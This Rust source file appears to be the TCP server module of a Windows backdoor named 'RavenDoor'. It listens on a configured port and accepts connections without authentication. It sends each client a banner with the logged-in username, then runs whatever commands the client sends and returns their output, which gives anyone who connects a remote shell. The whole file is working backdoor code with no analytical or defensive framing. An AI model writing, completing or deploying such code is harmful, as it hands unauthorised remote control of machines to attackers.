use tokio::net::TcpListener;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use std::sync::Arc;
use tokio::sync::Mutex;  
use crate::commands;
use crate::config::ServerConfig;

pub async fn start(config: &ServerConfig) -> Result<(), Box<dyn std::error::Error>> {
    let addr = format!("{}:{}", config.bind_addr, config.port);
    println!("[*] Escuchando en {}", addr);
    
    let listener = TcpListener::bind(&addr).await?;
    
    loop {
        let (socket, addr) = listener.accept().await?;
        println!("[+] Conexión desde: {}", addr);
        
        // Usar Mutex para acceso seguro concurrente
        let socket = Arc::new(Mutex::new(socket));
        
        tokio::spawn(async move {
            if let Err(e) = handle_client(socket, addr).await {
                println!("[!] Error con cliente {}: {}", addr, e);
            }
        });
    }
}

async fn handle_client(
    socket: Arc<Mutex<tokio::net::TcpStream>>,
    addr: std::net::SocketAddr,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut buffer = [0; 4096];
    
    // Enviar banner
    {
        let mut socket_guard = socket.lock().await;
        let banner = format!(
            "\nRavenDoor Windows - Connected from: {}\nUser: {}\n> ",
            addr,
            whoami::username()
        );
        socket_guard.write_all(banner.as_bytes()).await?;
    }
    
    loop {
        let n = {
            let mut socket_guard = socket.lock().await;
            match socket_guard.read(&mut buffer).await {
                Ok(0) => {
                    println!("[-] Cliente {} desconectado", addr);
                    return Ok(());
                }
                Ok(n) => n,
                Err(e) => {
                    println!("[!] Error lectura: {}", e);
                    return Err(e.into());
                }
            }
        };
        
        let input = String::from_utf8_lossy(&buffer[..n]);
        let input = input.trim();
        
        if input.is_empty() {
            let mut socket_guard = socket.lock().await;
            socket_guard.write_all(b"> ").await?;
            continue;
        }
        
        println!("[{}] Comando: {}", addr, input);
        

        let output = commands::execute(input).await;
        let response = format!("{}\n> ", output);
        
        {
            let mut socket_guard = socket.lock().await;
            if let Err(e) = socket_guard.write_all(response.as_bytes()).await {
                println!("[!] Error escritura: {}", e);
                break;
            }
        }
    }
    
    Ok(())
}